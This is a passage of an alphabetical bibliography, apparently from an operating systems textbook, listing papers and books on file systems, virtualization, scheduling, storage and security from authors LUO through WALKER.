LUO, T., MA, S., LEE, R., ZHANG, X., LIU, D., and ZHOU, L.: “S-CAVE: Effective SSD Caching to Improve Virtual Machine Storage Performance,” Proc. 22nd Int’l Conf. on Parallel Arch. and Compilation Tech., IEEE, pp. 103-112, 2013.
MA, A., DRAGGA, C., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: “ffsck: The Fast File System Checker,” Proc. 11th USENIX Conf. on File and Storage Tech., USENIX, 2013.
MAO, W.: “The Role and Effectiveness of Cryptography in Network Virtualization: A Position Paper,” Proc. Eighth ACM Asian SIGACT Symp. on Information, Computer, and Commun. Security, ACM, pp. 179-182, 2013.
MARINO, D., HAMMER, C., DOLBY, J., VAZIRI, M., TIP, F., and VITEK, J.: “Detecting Deadlock in Programs with Data-Centric Synchronization,” Proc. Int’l Conf. on Software Engineering, IEEE, pp. 322-331, 2013.
MARSH, B.D., SCOTT, M.L., LEBLANC, T.J., and MARKATOS, E.P.: “First-Class User-Level Threads,” Proc. 13th Symp. on Operating Systems Principles, ACM, pp. 110-121, 1991.
MASHTIZADEH, A.J., BITTAY, A., HUANG, Y.F., and MAZIERES, D.: “Replication, History, and Grafting in the Ori File System,” Proc. 24th Symp. on Operating System Principles, ACM, pp. 151-166, 2013.
MATTHUR, A., and MUNDUR, P.: “Dynamic Load Balancing Across Mirrored Multimedia Servers,” Proc. 2003 Int’l Conf. on Multimedia, IEEE, pp. 53-56, 2003.
MAXWELL, S.: Linux Core Kernel Commentary, Scottsdale, AZ: Coriolis Group Books, 2001.
MAZUREK, M.L., THERESKA, E., GUNAWARDENA, D., HARPER, R., and SCOTT, J.: “ZZFS: A Hybrid Device and Cloud File System for Spontaneous Users,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 195-208, 2012.
McKUSICK, M.K., BOSTIC, K., KARELS, M.J., QUARTERMAN, J.S.: The Design and Implementation of the 4.4BSD Operating System, Boston: Addison-Wesley, 1996.
McKUSICK, M.K., and NEVILLE-NEIL, G.V.: The Design and Implementation of the FreeBSD Operating System, Boston: Addison-Wesley, 2004.
McKUSICK, M.K.: “Disks from the Perspective of a File System,” Commun. of the ACM, vol. 55, pp. 53-55, Nov. 2012.
MEAD, N.R.: “Who Is Liable for Insecure Systems?” Computer, vol. 37, pp. 27-34, July 2004.
MELLOR-CRUMMEY, J.M., and SCOTT, M.L.: “Algorithms for Scalable Synchronization on Shared-Memory Multiprocessors,” ACM Trans. on Computer Systems, vol. 9, pp. 21-65, Feb. 1991.

MIKHAYLOV, K., and TERVONEN, J.: “Energy Consumption of the Mobile Wireless Sensor Network’s Node with Controlled Mobility,” Proc. 27th Int’l Conf. on Advanced Networking and Applications Workshops, IEEE, pp. 1582-1587, 2013.

MILOJICIC, D.: “Security and Privacy,” IEEE Concurrency, vol. 8, pp. 70-79, April-June 2000.

MOODY, G.: Rebel Code, Cambridge. MA: Perseus Publishing, 2001.
MOON, S., and REDDY, A.L.N.: “Don’t Let RAID Raid the Lifetime of Your SSD Array,” Proc. Fifth USENIX Workshop on Hot Topics in Storage and File Systems, USENIX, 2013.

MORRIS, R., and THOMPSON, K.: “Password Security: A Case History,” Commun. of the ACM, vol. 22, pp. 594-597, Nov. 1979.

MORUZ, G., and NEGOESCU, A.: “Outperforming LRU Via Competitive Analysis on Parametrized Inputs for Paging,” Proc. 23rd ACM-SIAM Symp. on Discrete Algorithms, SIAM, pp. 1669-1680.

MOSHCHUK, A., BRAGIN, T., GRIBBLE, S.D., and LEVY, H.M.: “A Crawler-Based Study of Spyware on the Web,” Proc.Network and Distributed System Security Symp., Internet Society, pp. 1-17, 2006.

MULLENDER, S.J., and TANENBAUM, A.S.: “Immediate Files,” Software Practice and Experience, vol. 14, pp. 365-368, 1984.

NACHENBERG, C.: “Computer Virus-Antivirus Coevolution,” Commun. of the ACM, vol. 40, pp. 46-51, Jan. 1997.

NARAYANAN, D., N. THERESKA, E., DONNELLY, A., ELNIKETY, S. and ROWSTRON, A.: “Migrating Server Storage to SSDs: Analysis of Tradeoffs,” Proc. Fourth European Conf. on Computer Systems (EUROSYS), ACM, 2009.

NELSON, M., LIM, B.-H., and HUTCHINS, G.: “Fast Transparent Migration for Virtual Machines,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 391-394, 2005.

NEMETH, E., SNYDER, G., HEIN, T.R., and WHALEY, B.: UNIX and Linux System Administration Handbook, 4th ed., Upper Saddle River, NJ: Prentice Hall, 2013.

NEWTON, G.: “Deadlock Prevention, Detection, and Resolution: An Annotated Bibliography,” ACM SIGOPS Operating Systems Rev., vol. 13, pp. 33-44, April 1979.

NIEH, J., and LAM, M.S.: “A SMART Scheduler for Multimedia Applications,” ACM Trans. on Computer Systems, vol. 21, pp. 117-163, May 2003.

NIGHTINGALE, E.B., ELSON, J., FAN, J., HOGMANN, O., HOWELL, J., and SUZUE, Y.: “Flat Datacenter Storage,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp. 1-15, 2012.

NIJIM, M., QIN, X., QIU, M., and LI, K.: “An Adaptive Energy-conserving Strategy for Parallel Disk Systems,” Future Generation Computer Systems, vol. 29, pp. 196-207, Jan. 2013.

NIST (National Institute of Standards and Technology): FIPS Pub. 180-1, 1995.

NIST (National Institute of Standards and Technology): “The NIST Definition of Cloud Computing,” Special Publication 800-145, Recommendations of the National Institute of Standards and Technology, 2011.

NO, J.: “NAND Flash Memory-Based Hybrid File System for High I/O Performance,” J. Parallel and Distributed Computing, vol. 72, pp. 1680-1695, Dec. 2012.

OH, Y., CHOI, J., LEE, D., and NOH, S.H.: “Caching Less for Better Performance: Balancing Cache Size and Update Cost of Flash Memory Cache in Hybrid Storage Systems,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 313-326, 2012.

OHNISHI, Y., and YOSHIDA, T.: “Design and Evaluation of a Distributed Shared Memory Network for Application-Specific PC Cluster Systems,” Proc. Workshops of Int’l Conf. on Advanced Information Networking and Applications, IEEE, pp. 63-70, 2011.

OKI, B., PFLUEGL, M., SIEGEL, A., and SKEEN, D.: “The Information Bus-An Architecture for Extensible Distributed Systems,” Proc. 14th Symp. on Operating Systems Principles, ACM, pp. 58-68, 1993.

ONGARO, D., RUMBLE, S.M., STUTSMAN, R., OUSTERHOUT, J., and ROSENBLUM, M.: “Fast Crash Recovery in RAMCloud,” Proc. 23rd Symp. of Operating Systems Principles, ACM, pp. 29-41, 2011.

ORGANICK, E.I.: The Multics System, Cambridge, MA: M.I.T. Press, 1972.
ORTOLANI, S., and CRISPO, B.: “NoisyKey: Tolerating Keyloggers via Keystrokes Hiding,” Proc. Seventh USENIX Workshop on Hot Topics in Security, USENIX, 2012.

ORWICK, P., and SMITH, G.: Developing Drivers with the Windows Driver Foundation, Redmond, WA: Microsoft Press, 2007.

OSTRAND, T.J., and WEYUKER, E.J.: “The Distribution of Faults in a Large Industrial Software System,” Proc. 2002 ACM SIGSOFT Int’l Symp. on Software Testing and Analysis, ACM, pp. 55-64, 2002.

OSTROWICK, J.: Locking Down Linux-An Introduction to Linux Security, Raleigh, NC: Lulu Press, 2013.

OUSTERHOUT, J.K.: “Scheduling Techniques for Concurrent Systems,” Proc. Third Int’l Conf. on Distrib. Computing Systems, IEEE, pp. 22-30, 1982.

OUSTERHOUT, J.L.: “Why Threads are a Bad Idea (for Most Purposes),” Presentation at Proc. USENIX Winter Conf., USENIX, 1996.

PARK, S., and SHEN, K.: “FIOS: A Fair, Efficient Flash I/O Scheduler,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 155-170, 2012.

PATE, S.D.: UNIX Filesystems: Evolution, Design, and Implementation, Hoboken, NJ: John Wiley & Sons, 2003.

PATHAK, A., HU, Y.C., and ZHANG, M.: “Where Is the Energy Spent inside My App? Fine Grained Energy Accounting on Smartphones with Eprof,” Proc. Seventh European Conf. on Computer Systems (EUROSYS), ACM, 2012.

PATTERSON, D., and HENNESSY, J.: Computer Organization and Design, 5th ed., Burlington, MA: Morgan Kaufman, 2013.

PATTERSON, D.A., GIBSON, G., and KATZ, R.: “A Case for Redundant Arrays of Inexpensive Disks (RAID),” Proc. ACM SIGMOD Int’l. Conf. on Management of Data, ACM, pp. 109-166, 1988.

PEARCE, M., ZEADALLY, S., and HUNT, R.: “Virtualization: Issues, Security Threats, and Solutions,” Computing Surveys, ACM, vol. 45, Art. 17, Feb. 2013.

PENNEMAN, N., KUDINSKLAS, D., RAWSTHORNE, A., DE SUTTER, B., and DE BOSSCHERE, K.: “Formal Virtualization Requirements for the ARM Architecture,” J. System Architecture: the EUROMICRO J., vol. 59, pp. 144-154, March 2013.

PESERICO, E.: “Online Paging with Arbitrary Associativity,” Proc. 14th ACM-SIAM Symp. on Discrete Algorithms, ACM, pp. 555-564, 2003.

PETERSON, G.L.: “Myths about the Mutual Exclusion Problem,” Information Processing Letters, vol. 12, pp. 115-116, June 1981.

PETRUCCI, V., and LOQUES, O.: “Lucky Scheduling for Energy-Efficient Heterogeneous Multi-core Systems,” Proc. USENIX Workshop on Power-Aware Computing and Systems, USENIX, 2012.

PETZOLD, C.: Programming Windows, 6th ed., Redmond, WA: Microsoft Press, 2013.
PIKE, R., PRESOTTO, D., THOMPSON, K., TRICKEY, H., and WINTERBOTTOM, P.: “The Use of Name Spaces in Plan 9,” Proc. 5th ACM SIGOPS European Workshop, ACM, pp. 1-5, 1992.

POPEK, G.J., and GOLDBERG, R.P.: “Formal Requirements for Virtualizable Third Generation Architectures,” Commun. of the ACM, vol. 17, pp. 412-421, July 1974.

PORTNOY, M.: “Virtualization Essentials,” Hoboken, NJ: John Wiley & Sons, 2012.
PRABHAKAR, R., KANDEMIR, M., and JUNG, M: “Disk-Cache and Parallelism Aware I/O Scheduling to Improve Storage System Performance,” Proc. 27th Int’l Symp. on Parallel and Distributed Computing, IEEE, pp. 357-368, 2013.

PRECHELT, L.: “An Empirical Comparison of Seven Programming Languages,” Computer, vol. 33, pp. 23-29, Oct. 2000.

PYLA, H., and VARADARAJAN, S.: “Transparent Runtime Deadlock Elimination,” Proc. 21st Int’l Conf. on Parallel Architectures and Compilation Techniques, ACM, pp. 477-478, 2012.

QUIGLEY, E.: UNIX Shells by Example, 4th ed., Upper Saddle River, NJ: Prentice Hall, 2004.

RAJGARHIA, A., and GEHANI, A.: “Performance and Extension of User Space File Systems,” Proc. 2010 ACM Symp. on Applied Computing, ACM, pp. 206-213, 2010.

RASANEH, S., and BANIROSTAM, T.: “A New Structure and Routing Algorithm for Optimizing Energy Consumption in Wireless Sensor Network for Disaster Management,” Proc. Fourth Int’l Conf. on Intelligent Systems, Modelling, and Simulation, IEEE, pp. 481-485.

RAVINDRANATH, L., PADHYE, J., AGARWAL, S., MAHAJAN, R., OBERMILLER, I., and SHAYANDEH, S.: “AppInsight: Mobile App Performance Monitoring in the Wild,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp. 107-120, 2012.

RECTOR, B.E., and NEWCOMER, J.M.: Win32 Programming, Boston: Addison-Wesley, 1997.

REEVES, R.D.: Windows 7 Device Driver, Boston: Addison-Wesley, 2010.
RENZELMANN, M.J., KADAV, A., and SWIFT, M.M.: “SymDrive: Testing Drivers without Devices,” Proc. 10th Symp. on Operating Systems Design and Implementation, USENIX, pp. 279-292, 2012.

RIEBACK, M.R., CRISPO, B., and TANENBAUM, A.S.: “Is Your Cat Infected with a Computer Virus?,” Proc. Fourth IEEE Int’l Conf. on Pervasive Computing and Commun., IEEE, pp. 169-179, 2006.

RITCHIE, D.M., and THOMPSON, K.: “The UNIX Timesharing System,” Commun. of the ACM, vol. 17, pp. 365-375, July 1974.

RIVEST, R.L., SHAMIR, A., and ADLEMAN, L.: “On a Method for Obtaining Digital Signatures and Public Key Cryptosystems,” Commun. of the ACM, vol. 21, pp. 120-126, Feb. 1978.

RIZZO, L.: “Netmap: A Novel Framework for Fast Packet I/O,” Proc. USENIX Ann. Tech. Conf., USENIX, 2012.

ROBBINS, A: UNIX in a Nutshell, Sebastopol, CA: O’Reilly & Associates, 2005.
RODRIGUES, E.R., NAVAUX, P.O., PANETTA, J., and MENDES, C.L.: “A New Technique for Data Privatization in User-Level Threads and Its Use in Parallel Applications,” Proc. 2010 Symp. on Applied Computing, ACM, pp. 2149-2154, 2010.

RODRIGUEZ-LUJAN, I., BAILADOR, G., SANCHEZ-AVILA, C., HERRERO, A., and VIDAL-DE-MIGUEL, G.: “Analysis of Pattern Recognition and Dimensionality Reduction Techniques for Odor Biometrics,” vol. 52, pp. 279-289, Nov. 2013.

ROSCOE, T., ELPHINSTONE, K., and HEISER, G.: “Hype and Virtue,” Proc. 11th Workshop on Hot Topics in Operating Systems, USENIX, pp. 19-24, 2007.

ROSENBLUM, M., BUGNION, E., DEVINE, S. and HERROD, S.A.: “Using the SIMOS Machine Simulator to Study Complex Computer Systems,” ACM Trans. Model. Comput. Simul., vol. 7, pp. 78-103, 1997.

ROSENBLUM, M., and GARFINKEL, T.: “Virtual Machine Monitors: Current Technology and Future Trends,” Computer, vol. 38, pp. 39-47, May 2005.

ROSENBLUM, M., and OUSTERHOUT, J.K.: “The Design and Implementation of a Log-Structured File System,” Proc. 13th Symp. on Operating Systems Principles, ACM, pp. 1-15, 1991.

ROSSBACH, C.J., CURREY, J., SILBERSTEIN, M., RAY, and B., WITCHEL, E.: “PTask: Operating System Abstractions to Manage GPUs as Compute Devices,” Proc. 23rd Symp. of Operating Systems Principles, ACM, pp. 233-248, 2011.

ROSSOW, C., ANDRIESSE, D., WERNER, T., STONE-GROSS, B., PLOHMANN, D., DIETRICH, C.J., and BOS, H.: “SoK: P2PWNED-Modeling and Evaluating the Resilience of Peer-to-Peer Botnets,” Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 97-111, 2013.

ROZIER, M., ABROSSIMOV, V., ARMAND, F., BOULE, I., GIEN, M., GUILLEMONT, M., HERRMANN, F., KAISER, C., LEONARD, P., LANGLOIS, S., and NEUHAUSER, W.: “Chorus Distributed Operating Systems,” Computing Systems, vol. 1, pp. 305-379, Oct. 1988.

RUSSINOVICH, M., and SOLOMON, D.: Windows Internals, Part 1, Redmond, WA: Microsoft Press, 2012.

RYZHYK, L., CHUBB, P., KUZ, I., Le SUEUR, E., and HEISER, G.: “Automatic Device Driver Synthesis with Termite,” Proc. 22nd Symp. on Operating Systems Principles, ACM, 2009.

RYZHYK, L., KEYS, J., MIRLA, B., RAGNUNATH, A., VIJ, M., and HEISER, G.: “Improved Device Driver Reliability through Hardware Verification Reuse,” Proc. 16th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 133-134, 2011.

SACKMAN, H., ERIKSON, W.J., and GRANT, E.E.: “Exploratory Experimental Studies Comparing Online and Offline Programming Performance,” Commun. of the ACM, vol. 11, pp. 3-11, Jan. 1968.

SAITO, Y., KARAMANOLIS, C., KARLSSON, M., and MAHALINGAM, M.: “Taming Aggressive Replication in the Pangea Wide-Area File System,” Proc. Fifth Symp. on Operating Systems Design and Implementation, USENIX, pp. 15-30, 2002.

SALOMIE T.-I., SUBASU, I.E., GICEVA, J., and ALONSO, G.: “Database Engines on Multicores: Why Parallelize When You can Distribute?,” Proc. Sixth European Conf. on Computer Systems (EUROSYS), ACM, pp. 17-30, 2011.

SALTZER, J.H.: “Protection and Control of Information Sharing in MULTICS,” Commun. of the ACM, vol. 17, pp. 388-402, July 1974.

SALTZER, J.H., and KAASHOEK, M.F.: Principles of Computer System Design: An Introduction, Burlington, MA: Morgan Kaufmann, 2009.

SALTZER, J.H., REED, D.P., and CLARK, D.D.: “End-to-End Arguments in System Design,” ACM Trans. on Computer Systems, vol. 2, pp. 277-288, Nov. 1984.

SALTZER, J.H., and SCHROEDER, M.D.: “The Protection of Information in Computer Systems,” Proc. IEEE, vol. 63, pp. 1278-1308, Sept. 1975.

SALUS, P.H.: “UNIX At 25,” Byte, vol. 19, pp. 75-82, Oct. 1994.
SASSE, M.A.: “Red-Eye Blink, Bendy Shuffle, and the Yuck Factor: A User Experience of Biometric Airport Systems,” IEEE Security and Privacy, vol. 5, pp. 78-81, May/June 2007.

SCHEIBLE, J.P.: “A Survey of Storage Options,” Computer, vol. 35, pp. 42-46, Dec. 2002.
SCHINDLER, J., SHETE, S., and SMITH, K.A.: “Improving Throughput for Small Disk Requests with Proximal I/O,” Proc. Ninth USENIX Conf. on File and Storage Tech., USENIX, pp. 133-148, 2011.

SCHWARTZ, C., PRIES, R., and TRAN-GIA, P.: “A Queuing Analysis of an Energy-Saving Mechanism in Data Centers,” Proc. 2012 Int’l Conf. on Inf. Networking, IEEE, pp. 70-75, 2012.

SCOTT, M., LEBLANC, T., and MARSH, B.: “Multi-Model Parallel Programming in Psyche,” Proc. Second ACM Symp. on Principles and Practice of Parallel Programming, ACM, pp. 70-78, 1990.

SEAWRIGHT, L.H., and MACKINNON, R.A.: “VM/370-A Study of Multiplicity and Usefulness,” IBM Systems J., vol. 18, pp. 4-17, 1979.

SEREBRYANY, K., BRUENING, D., POTAPENKO, A., and VYUKOV, D.: “AddressSanitizer: A Fast Address Sanity Checker,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 28-28, 2013.

SEVERINI, M., SQUARTINI, S., and PIAZZA, F.: “An Energy Aware Approach for Task Scheduling in Energy-Harvesting Sensor Nodes,” Proc. Ninth Int’l Conf. on Advances in Neural Networks, Springer-Verlag, pp. 601-610, 2012.

SHEN, K., SHRIRAMAN, A., DWARKADAS, S., ZHANG, X., and CHEN, Z.: “Power Containers: An OS Facility for Fine-Grained Power and Energy Management on Multicore Servers,” Proc. 18th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, pp. 65-76, 2013.

SILBERSCHATZ, A., GALVIN, P.B., and GAGNE, G.: Operating System Concepts, 9th ed., Hoboken, NJ: John Wiley & Sons, 2012.

SIMON, R.J.: Windows NT Win32 API SuperBible, Corte Madera, CA: Sams Publishing, 1997.

SITARAM, D., and DAN, A.: Multimedia Servers, Burlington, MA: Morgan Kaufman, 2000.
SLOWINSKA, A., STANESCU, T., and BOS, H.: “Body Armor for Binaries: Preventing Buffer Overflows Without Recompilation,” Proc. USENIX Ann. Tech. Conf., USENIX, 2012.

SMALDONE, S., WALLACE, G., and HSU, W.: “Efficiently Storing Virtual Machine Backups,” Proc. Fifth USENIX Conf. on Hot Topics in Storage and File Systems, USENIX, 2013.

SMITH, D,K., and ALEXANDER, R.C.: Fumbling the Future: How Xerox Invented, Then Ignored, the First Personal Computer, New York: William Morrow, 1988.

SNIR, M., OTTO, S.W., HUSS-LEDERMAN, S., WALKER, D.W., and DONGARRA, J.: MPI: The Complete Reference Manual, Cambridge, MA: M.I.T. Press, 1996.

SNOW, K., MONROSE, F., DAVI, L., DMITRIENKO, A., LIEBCHEN, C., and SADEGHI, A.-R.: “Just-In-Time Code Reuse: On the Effectiveness of Fine-Grained Address Space Layout Randomization,” Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 574-588, 2013.

SOBELL, M.: A Practical Guide to Fedora and Red Hat Enterprise Linux, 7th ed., Upper Saddle River, NJ: Prentice-Hall, 2014.

SOORTY, B.: “Evaluating IPv6 in Peer-to-peer Gigabit Ethernet for UDP Using Modern Operating Systems,” Proc. 2012 Symp. on Computers and Commun., IEEE, pp. 534-536, 2012.

SPAFFORD, E., HEAPHY, K., and FERBRACHE, D.: Computer Viruses, Arlington, VA: ADAPSO, 1989.

STALLINGS, W.: Operating Systems, 7th ed., Upper Saddle River, NJ: Prentice Hall, 2011.
STAN, M.R., and SKADRON, K: “Power-Aware Computing,” Computer, vol. 36, pp. 35-38, Dec. 2003.

STEINMETZ, R., and NAHRSTEDT, K.: Multimedia: Computing, Communications and Applications, Upper Saddle River, NJ: Prentice Hall, 1995.

STEVENS, R.W., and RAGO, S.A.: “Advanced Programming in the UNIX Environment,” Boston: Addison-Wesley, 2013.

STOICA, R., and AILAMAKI, A.: “Enabling Efficient OS Paging for Main-Memory OLTP Databases,” Proc. Ninth Int’l Workshop on Data Management on New Hardware, ACM, Art. 7. 2013.

STONE, H.S., and BOKHARI, S.H.: “Control of Distributed Processes,” Computer, vol. 11, pp. 97-106, July 1978.

STORER, M.W., GREENAN, K.M., MILLER, E.L., and VORUGANTI, K.: “POTSHARDS: Secure Long-Term Storage without Encryption,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 143-156, 2007.

STRATTON, J.A., RODRIGUES, C., SUNG, I.-J., CHANG, L.-W., ANSSARI, N., LIU, G., HWU, W.-M., and OBEID, N.: “Algorithm and Data Optimization Techniques for Scaling to Massively Threaded Systems,” Computer, vol. 45, pp. 26-32, Aug. 2012.

SUGERMAN, J., VENKITACHALAM , G., and LIM, B.-H: “Virtualizing I/O Devices on VMware Workstation’s Hosted Virtual Machine Monitor,” Proc. USENIX Ann. Tech. Conf., USENIX, pp. 1-14, 2001.

SULTANA, S., and BERTINO, E.: “A File Provenance System,” Proc. Third Conf. on Data and Appl. Security and Privacy, ACM, pp. 153-156, 2013.

SUN, Y., CHEN, M., LIU, B., and MAO, S.: “FAR: A Fault-Avoidance Routing Method for Data Center Networks with Regular Topology,” Proc. Ninth ACM/IEEE Symp. for Arch.for Networking and Commun. Systems, ACM, pp. 181-190, 2013.

SWANSON, S., and CAULFIELD, A.M.: “Refactor, Reduce, Recycle: Restructuring the I/O Stack for the Future of Storage,” Computer, vol. 46, pp. 52-59, Aug. 2013.

TAIABUL HAQUE, S.M., WRIGHT, M., and SCIELZO, S.: “A Study of User Password Strategy for Multiple Accounts,” Proc. Third Conf. on Data and Appl. Security and Privacy, ACM, pp. 173-176, 2013.

TALLURI, M., HILL, M.D., and KHALIDI, Y.A.: “A New Page Table for 64-Bit Address Spaces,” Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 184-200, 1995.

TAM, D., AZIMI, R., and STUMM, M.: “Thread Clustering: Sharing-Aware Scheduling,” Proc. Second European Conf. on Computer Systems (EUROSYS), ACM, pp. 47-58, 2007.

TANENBAUM, A.S., and AUSTIN, T.: Structured Computer Organization, 6th ed., Upper Saddle River, NJ: Prentice Hall, 2012.

TANENBAUM, A.S., HERDER, J.N., and BOS, H.: “File Size Distribution on UNIX Systems: Then and Now,” ACM SIGOPS Operating Systems Rev., vol. 40, pp. 100-104, Jan. 2006.

TANENBAUM, A.S., VAN RENESSE, R., VAN STAVEREN, H., SHARP, G.J., MULLENDER, S.J., JANSEN, J., and VAN ROSSUM, G.: “Experiences with the Amoeba Distributed Operating System,” Commun. of the ACM, vol. 33, pp. 46-63, Dec. 1990.

TANENBAUM, A.S., and VAN STEEN, M.R.: Distributed Systems, 2nd ed., Upper Saddle River, NJ: Prentice Hall, 2007.

TANENBAUM, A.S., and WETHERALL, D.J: Computer Networks, 5th ed., Upper Saddle River, NJ: Prentice Hall, 2010.

TANENBAUM, A.S., and WOODHULL, A.S.: Operating Systems: Design and Implementation, 3rd ed., Upper Saddle River, NJ: Prentice Hall, 2006.

TARASOV, V., HILDEBRAND, D., KUENNING, G., and ZADOK, E.: “Virtual Machine Workloads: The Case for New NAS Benchmarks,” Proc. 11th Conf. on File and Storage Technologies, USENIX, 2013.

TEORY, T.J.: “Properties of Disk Scheduling Policies in Multiprogrammed Computer Systems,” Proc. AFIPS Fall Joint Computer Conf., AFIPS, pp. 1-11, 1972.

THEODOROU, D., MAK, R.H., KEIJSER, J.J., and SUERINK, R.: “NRS: A System for Automated Network Virtualization in IAAS Cloud Infrastructures,” Proc. Seventh Int’l Workshop on Virtualization Tech. in Distributed Computing, ACM, pp. 25-32, 2013.

THIBADEAU, R.: “Trusted Computing for Disk Drives and Other Peripherals,” IEEE Security and Privacy, vol. 4, pp. 26-33, Sept./Oct. 2006.

THOMPSON, K.: “Reflections on Trusting Trust,” Commun. of the ACM, vol. 27, pp. 761-763, Aug. 1984.

TIMCENKO, V., and DJORDJEVIC, B.: “The Comprehensive Performance Analysis of Striped Disk Array Organizations-RAID-0,” Proc. 2013 Int’l Conf. on Inf. Systems and Design of Commun., ACM, pp. 113-116, 2013.

TRESADERN, P., COOTES, T., POH, N., METEJKA, P., HADID, A., LEVY, C., McCOOL, C., and MARCEL, S.: “Mobile Biometrics: Combined Face and Voice Verification for a Mobile Platform,” IEEE Pervasive Computing, vol. 12, pp. 79-87, Jan. 2013.

TSAFRIR, D., ETSION, Y., FEITELSON, D.G., and KIRKPATRICK, S.: “System Noise, OS Clock Ticks, and Fine-Grained Parallel Applications,” Proc. 19th Ann. Int’l Conf. on Supercomputing, ACM, pp. 303-312, 2005.

TUAN-ANH, B., HUNG, P.P., and HUH, E.-N.: “A Solution of Thin-Thick Client Collaboration for Data Distribution and Resource Allocation in Cloud Computing,” Proc. 2013 Int’l Conf. on Inf. Networking, IEEE, pp. 238-243, 2103.

TUCKER, A., and GUPTA, A.: “Process Control and Scheduling Issues for Multiprogrammed Shared-Memory Multiprocessors,” Proc. 12th Symp. on Operating Systems Principles, ACM, pp. 159-166, 1989.

UHLIG, R., NAGLE, D., STANLEY, T., MUDGE, T., SECREST, S., and BROWN, R.: “Design Tradeoffs for Software-Managed TLBs,” ACM Trans. on Computer Systems, vol. 12, pp. 175-205, Aug. 1994.

UHLIG, R. NEIGER, G., RODGERS, D., SANTONI, A.L., MARTINS, F.C.M., ANDERSON, A.V., BENNET, S.M., KAGI, A., LEUNG, F.H., and SMITH, L.: “Intel Virtualization Technology,” Computer, vol. 38, pp. 48-56, 2005.

UR, B., KELLEY, P.G., KOMANDURI, S., LEE, J., MAASS, M., MAZUREK, M.L., PASSARO, T., SHAY, R., VIDAS, T., BAUER, L., CHRISTIN, N., and CRANOR, L.F.: “How Does Your Password Measure Up? The Effect of Strength Meters on Password Creation,” Proc. 21st USENIX Security Symp., USENIX, 2012.

VAGHANI, S.B.: “Virtual Machine File System,” ACM SIGOPS Operating Systems Rev., vol. 44, pp. 57-70, 2010.

VAHALIA, U.: UNIX Internals-The New Frontiers, Upper Saddle River, NJ: Prentice Hall, 2007.

VAN DOORN, L.: The Design and Application of an Extensible Operating System, Capelle a/d Ijssel: Labyrint Publications, 2001.

VAN MOOLENBROEK, D.C., APPUSWAMY, R., and TANENBAUM, A.S.: “Integrated System and Process Crash Recovery in the Loris Storage Stack,” Proc. Seventh Int’l Conf. on Networking, Architecture, and Storage, IEEE, pp. 1-10, 2012.

VAN ’T NOORDENDE, G., BALOGH, A., HOFMAN, R., BRAZIER, F.M.T., and TANENBAUM, A.S.: “A Secure Jailing System for Confining Untrusted Applications,” Proc. Second Int’l Conf. on Security and Cryptography, INSTICC, pp. 414-423, 2007.

VASWANI, R., and ZAHORJAN, J.: “The Implications of Cache Affinity on Processor Scheduling for Multiprogrammed Shared-Memory Multiprocessors,” Proc. 13th Symp. on Operating Systems Principles, ACM, pp. 26-40, 1991.

VAN DER VEEN, V., DDUTT-SHARMA, N., CAVALLARO, L., and BOS, H.: “Memory Errors: The Past, the Present, and the Future,” Proc. 15th Int’l Conf. on Research in Attacks, Intrusions, and Defenses, Berlin: Springer-Verlag, pp. 86-106, 2012.

VENKATACHALAM, V., and FRANZ, M.: “Power Reduction Techniques for Microprocessor Systems,” Computing Surveys, vol. 37, pp. 195-237, Sept. 2005.

VIENNOT, N., NAIR, S., and NIEH, J.: “Transparent Mutable Replay for Multicore Debugging and Patch Validation,” Proc. 18th Int’l Conf. on Arch. Support for Prog. Lang. and Operating Systems, ACM, 2013.

VINOSKI, S.: “CORBA: Integrating Diverse Applications within Distributed Heterogeneous Environments,” IEEE Communications Magazine, vol. 35, pp. 46-56, Feb. 1997.

VISCAROLA, P.G, MASON, T., CARIDDI, M., RYAN, B., and NOONE, S.: Introduction to the Windows Driver Foundation Kernel-Mode Framework, Amherst, NH: OSR Press, 2007.

VMWARE, Inc.: “Achieving a Million I/O Operations per Second from a Single VMware vSphere 5.0 Host,” [http://www.vmware.com/files/pdf/1M-iops-perf-vsphere5.pdf,](http://www.vmware.com/files/pdf/1M-iops-perf-vsphere5.pdf) 2011.

VOGELS, W.: “File System Usage in Windows NT 4.0,” Proc. 17th Symp. on Operating Systems Principles, ACM, pp. 93-109, 1999.

VON BEHREN, R., CONDIT, J., and BREWER, E.: “Why Events Are A Bad Idea (for High-Concurrency Servers),” Proc. Ninth Workshop on Hot Topics in Operating Systems, USENIX, pp. 19-24, 2003.

VON EICKEN, T., CULLER, D., GOLDSTEIN, S.C., and SCHAUSER, K.E.: “Active Messages: A Mechanism for Integrated Communication and Computation,” Proc. 19th Int’l Symp. on Computer Arch., ACM, pp. 256-266, 1992.

VOSTOKOV, D.: Windows Device Drivers: Practical Foundations, Opentask, 2009.
VRABLE, M., SAVAGE, S., and VOELKER, G.M.: “BlueSky: A Cloud-Backed File System for the Enterprise,” Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp. 124-250, 2012.

WAHBE, R., LUCCO, S., ANDERSON, T., and GRAHAM, S.: “Efficient Software-Based Fault Isolation,” Proc. 14th Symp. on Operating Systems Principles, ACM, pp. 203-216, 1993.

WALDSPURGER, C.A.: “Memory Resource Management in VMware ESX Server,” ACM SIGOPS Operating System Rev., vol 36, pp. 181-194, Jan. 2002.

WALDSPURGER, C.A., and ROSENBLUM, M.: “I/O Virtualization,” Commun. of the ACM, vol. 55, pp. 66-73, 2012.

WALDSPURGER, C.A., and WEIHL, W.E.: “Lottery Scheduling: Flexible Proportional-Share Resource Management,” Proc. First Symp. on Operating Systems Design and Implementation, USENIX, pp. 1-12, 1994.

WALKER, W., and CRAGON, H.G.: “Interrupt Processing in Concurrent Processors,” Computer, vol. 28, pp. 36-46, June 1995.

